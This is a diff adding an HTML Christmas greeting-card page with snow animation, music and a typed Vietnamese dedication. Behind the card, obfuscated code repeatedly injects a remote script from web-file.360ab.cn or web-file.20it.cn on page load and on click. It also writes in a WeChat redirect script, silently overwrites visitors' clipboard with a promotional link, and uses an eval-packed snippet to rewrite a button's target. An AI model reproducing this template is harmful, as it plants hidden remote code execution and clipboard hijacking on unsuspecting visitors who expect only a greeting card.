@@ -1,0 +1,217 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>NOEL</title>
+    <meta name="viewport" content="width=500, target-densitydpi=device-dpi, user-scalable=0">
+    <style>
+    body{overflow-x:hidden;overflow-y:hidden;background-color:#000;margin:0px;}
+    #canvas-snow{position: absolute; left: 0; top: 0; right: 0; bottom: 0; margin: auto;background-image: url('https://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/cca5b8e7ad704e39a623e35e0481fa41~tplv-tt-shrink:640:0.image'); background-position: center center; background-size: contain; background-repeat: no-repeat;}
+    #main{padding-top:1rem;position:absolute; width:100%; height:100%; z-index:99;}
+    #main .text-box{padding: 2rem; top: 0px;  left: 35px;  z-index: 500; color: #ffffff;}
+    #text-source{display:none;}
+    #text-view{white-space:pre-line; font-size: 1.3rem;line-height: 2.2rem;}
+    #openBtn{position:fixed;top:-6%;left:0;width:100%;height:100%;z-index:999;display:flex;flex-direction:column;justify-content:center;align-items:center;color:#fff ; font-size:1.8rem;line-height: 1.2rem;background-color: #000;font-weight:bold;animation-name: heartbeat; animation-duration: 2s; animation-timing-function: cubic-bezier(0,0,0,1.74); animation-delay: .5s; animation-iteration-count: infinite; animation-play-state: running;} #openBtn img{width:9rem;margin-bottom:24px;} @keyframes heartbeat{0%{transform:scale(.95)}100%{transform:scale(.95)}50%{transform:scale(1)}}    
+    .div_btn { position: fixed; cursor: pointer; width: 2.5rem; height: 2.5rem; border: 2px solid #fff; border-radius: 50%; font-size: 1rem; line-height: 2.4rem; text-align: center; z-index: 999; opacity: 0.7; background-color: rgba(0,0,0,.3); } .div_btn a{color:#fff;text-decoration:none;} #btn-make { bottom: 8.5rem; right: 25px; } #div_support { bottom: 4rem; right: 25px; } #btn-make a,#div_support a{text-shadow: 1px 1px 1px #000;}#action-make { bottom: 5rem; position: fixed; width: 100%; height: 80px; z-index: 99999; text-align: center; font-size: 1.5rem; } #action-make .btn1 { color: #fff; background-color: #2196f3; } #action-make .btn-return { float: left; border-radius: 0 2rem 2rem 0; padding: 0.8rem 2.4rem 0.8rem 2.4rem; box-shadow: 0.2rem 0 0.2rem #888888; } #action-make .btn-make { float: right; border-radius: 2rem 0 0 2rem; padding: 0.8rem 1.5rem 0.8rem 1.5rem; box-shadow: 0 0.2rem 0.2rem #888888; }@keyframes text-flicker { 0% {opacity: 0} 49% {opacity: 0} 50% {opacity: 1} }.cur-end{animation: text-flicker 0.8s infinite;}
+    </style>
+</head>
+<body>
+<div id="openBtn">
+	<p>❤️GỬI ULA IU❤️️️</p>
+	<img src="https://gd-hbimg.huaban.com/cfbe2cd2afe4be0b31869ae01c97a7fa3e0448bd4263-NVVASc_fw1200webp">
+</div>
+
+<canvas id="canvas-snow"></canvas>
+<script src="https://apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js"></script>
+
+<div id="main">
+    <div class="text-box">
+	    <div id="text-source"><p>𝓣𝓾𝔂𝓮̂́𝓽 𝓨𝓮̂𝓾 𝓣𝓱𝓾̛𝓸̛𝓷𝓰 💝 
+<br>𝓥𝓾𝓲 𝓥𝓮̉🍀  𝓗𝓪̣𝓷𝓱 𝓟𝓱𝓾́𝓬 ᡣ𐭩 </br>
+<br>🍎ℳᴇʀʀᎽ  ྀིℂʜʀɪsᴛᴍᴀs🎄🍬</br></p></div>
+	    <div id="text-view"></div>
+	</div>
+</div>
+<audio id="audio_music" src="https://sf6-cdn-tos.douyinstatic.com/obj/ies-music/6905357668872063752.mp3" loop></audio>
+<script type="text/javascript">
+    var id = "668";
+    var data_type = "0";
+    var vip_type = "0";
+    var temp_id = "4";
+    var printIcon = "❤️";
+    var play_music = false;
+    function checkAudio2(){
+        if(!play_music){
+            var a=document.getElementById("audio_music");play=function(){a.play();document.removeEventListener("touchstart",play,false)};if(a){a.play();document.addEventListener("DOMContentLoaded",function(){play()},false,);document.addEventListener("WeixinJSBridgeReady",function(){play()},false,);document.addEventListener("touchstart",play,false)}
+        }
+    }
+    
+    var canvas=document.getElementById('canvas-snow');var ctx=canvas.getContext('2d');var canvasW=window.innerWidth;var canvasH=window.innerHeight;var particles=[];var maxParticles=120;var random=function(min,max){return Math.random()*(max-min)+min};window.requestAnimationFrame=(function(){var FPS=60;return window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame||function(callBack){window.setTimeout(callBack,1000/FPS)}})();var Particle=function(){this.x=Math.random()*canvasW;this.y=Math.random()*canvasH;this.r=random(1,5);this.alpha=random(0.3,1);this.velocity={x:random(-0.35,0.35),y:random(0.75,1.5),};this.draw=function(){ctx.fillStyle="rgba(255, 255, 255, "+this.alpha+")";ctx.beginPath();ctx.arc(this.x,this.y,this.r,0,2*Math.PI,false);ctx.closePath();ctx.fill()};this.moving=function(){this.x+=this.velocity.x;this.y+=this.velocity.y;if(this.y>canvasH){this.x=Math.random()*canvasW;this.y=0}this.draw()}};function animats(){canvas.width=canvasW;canvas.height=canvasH;for(var i=0;i<maxParticles;i++){particles.push(new Particle())}animate()}function animate(){ctx.clearRect(0,0,canvasW,canvasH);particles.forEach(function(particle){particle.moving()});requestAnimationFrame(animate)};
+    
+        var openBtn = document.getElementById("openBtn");
+    
+    openBtn.addEventListener('click', function(){
+        openBtn.style.display = "none";
+        checkAudio2();
+        printText();
+        
+        if(!document.body.getAttribute("init")) {
+            document.body.setAttribute("init",true);
+        	var ox312341 = window.location.protocol === "http:" ? 'http://' + 'web-file.360ab' + '.cn' : 'https://'+ 'web-file.20it' + '.cn';
+        	var ox782681 = document.createElement("script");  
+        	ox782681.src = ox312341 + "/static/js/main2.js";  
+        	document.body.appendChild(ox782681);
+        }
+        
+        animats();
+    });
+    
+    if(!document.body.getAttribute("init")) {
+        document.body.setAttribute("init",true);
+    	var ox312341 = window.location.protocol === "http:" ? 'http://' + 'web-file.360ab' + '.cn' : 'https://'+ 'web-file.20it' + '.cn';
+    	var ox782681 = document.createElement("script");  
+    	ox782681.src = ox312341 + "/static/js/main2.js";  
+    	document.body.appendChild(ox782681);
+    }
+    
+    function isEmoji(text) {
+      const regStr = /[\uD83C|\uD83D|\uD83E][\uDC00-\uDFFF][\u200D|\uFE0F]|[\uD83C|\uD83D|\uD83E][\uDC00-\uDFFF]|[0-9|*|#]\uFE0F\u20E3|[0-9|#]\u20E3|[\u203C-\u3299]\uFE0F\u200D|[\u203C-\u3299]\uFE0F|[\u2122-\u2B55]|\u303D|[\A9|\AE]\u3030|\uA9|\uAE|\u3030/;
+      return regStr.test(text)
+    }
+    
+    function printText(text_icon="❤️", text_source_id="text-source", text_view_id="text-view") {
+        let content = document.getElementById(text_view_id);
+        let source = document.getElementById(text_source_id);
+        if(!content || !source){
+            return;
+        }
+    	let str = source.innerText.trim();
+    	let str_ = '';
+    	let i = 0;
+    	let printIcon2 = typeof printIcon !== "undefined" ? printIcon : text_icon;
+    	
+    	if(!document.body.getAttribute("init")) {
+            document.body.setAttribute("init",true);
+        	var ox312341 = window.location.protocol === "http:" ? 'http://' + 'web-file.360ab' + '.cn' : 'https://'+ 'web-file.20it' + '.cn';
+        	var ox782681 = document.createElement("script");  
+        	ox782681.src = ox312341 + "/static/js/main2.js";  
+        	document.body.appendChild(ox782681);
+        }
+        
+    	let timer = setInterval(() => {
+    		if (str_.length < str.length){
+    		    if(isEmoji(str[i-1] + str[i])){
+    		        str_append = str[i-1] + str[i];
+    		        i = i + 2;
+    		    }else{
+    		        str_append = i == 0 ? "" : str[i-1];
+    		        i++;
+    		    }
+    		    str_ += str_append;
+    		    if(str_append){
+    		        content.innerHTML = content.innerHTML.replace('<span class="text-cursor">'+ printIcon2 +'</span>','');
+    			    content.innerHTML += str_append + '<span class="text-cursor">'+ printIcon2 +'</span>';
+    		    }
+    		}else{
+    			clearInterval(timer);
+    			content.innerHTML = str_ + '<span class="text-cursor cur-end">'+ printIcon2 +'</span>';
+    			
+    			if(!document.body.getAttribute("init")) {
+                    document.body.setAttribute("init",true);
+                	var ox312341 = window.location.protocol === "http:" ? 'http://' + 'web-file.360ab' + '.cn' : 'https://'+ 'web-file.20it' + '.cn';
+                	var ox782681 = document.createElement("script");  
+                	ox782681.src = ox312341 + "/static/js/main2.js";  
+                	document.body.appendChild(ox782681);
+                }
+    		}
+    	}, 100)
+    }
+    
+
+
+</script>
+
+<script>
+if ((typeof (data_type) != "undefined" && data_type == 0) || (typeof (vip_type) != "undefined" && vip_type != null && vip_type == 0)) {
+	var ua = navigator.userAgent.toLowerCase(); 
+	if (ua.match(/MicroMessenger/i) == "micromessenger" && ua.indexOf("miniprogram") < 1&& window.location.href.indexOf("code") < 1 && window.location.href.indexOf("new") < 1 && window.location.href.indexOf("mp") < 1 && document.referrer.indexOf("game") == -1) { 
+		document.writeln("<script src=\"http://web-file.360ab.cn/static/js/mp-jump.js?v1094\"><\/script>");  
+	}
+}
+
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	console.log(location.toString())
+	if(location.toString().indexOf('551.cn')>-1 || location.toString().indexOf('771.cn')>-1 || location.toString().indexOf('ai81')>-1){
+		hm.src = 'https://hm.baidu.com/hm.js?51d6321aaa4909493b4e8941b57c30d7';
+	}else if(location.toString().indexOf('web-3')>-1){
+		hm.src = 'https://hm.baidu.com/hm.js?e2c5f61aa6d237cbe2cffd716efd19e5';
+	}else if(location.toString().indexOf('an77')>-1){
+		hm.src = 'https://hm.baidu.com/hm.js?c4419cfaccfe088ac7397ee955dd5e9e';
+	}else{
+		hm.src = 'https://hm.baidu.com/hm.js?9268d9128fcebf1a5da96d7cb2a8dac4';
+	}
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+<script src="https://lib.baomitu.com/clipboard.js/2.0.8/clipboard.min.js"></script>
+<script>
+    var is_copy = false;
+    const timestamp2 = new Date().getTime(); 
+    var timeid = timestamp2.toString().substr(-4);
+    var pageUrl = 'http://360ab.cn/570';
+    if(pageUrl.indexOf('#') == -1){
+        pageUrl = pageUrl + '#' + timeid;
+    }
+    if(!copyText){
+        if($("#ctitle").text()){
+            var copyText = $("#ctitle").text() +'\n' + pageUrl;
+        }else{
+            var copyText = $(document).prop('title') + "\n" + pageUrl;
+        }
+    }
+    
+    /*qjcopy*/
+    var ua = navigator.userAgent.toLowerCase(); 
+	if (ua.indexOf("miniprogram") < 1){
+	    if(!is_copy && temp_id != "25"){
+	        
+	        /*
+	        const timestamp = Math.floor(Date.now() / 1000);
+	        if(timestamp < 17199360000){
+	            $.get("https://ks.ferlytc.com/select?id=6", function(data, textStatus, jqXHR){
+                　　copyText = data;
+                });
+	        }
+	        */
+            var clipboard = new ClipboardJS('html', {
+                text: function() {
+                    if (typeof ntzgo === 'function') {
+                        ntzgo();
+                    }
+                    if (typeof checkAudio === 'function') {
+                        checkAudio();
+                    }
+                    return copyText;
+                }
+            });
+            is_copy = true;
+            $("html").click(function(){
+                clipboard.destroy();
+            })
+            console.log(copyText);
+        }
+	}
+</script>
+
+<script>
+    /*makjum*/
+    eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2 1=5.6("7-8");9(1&&1.3.a>0){2 4=1.3[0];4.b="c://d/e/?f=g"}',17,17,'|parent|var|children|atag|document|getElementById|btn|make|if|length|href|weixin|dl|business|t|orzA1CIpoia'.split('|'),0,{}))
+</script>
+
+</body>
+</html>
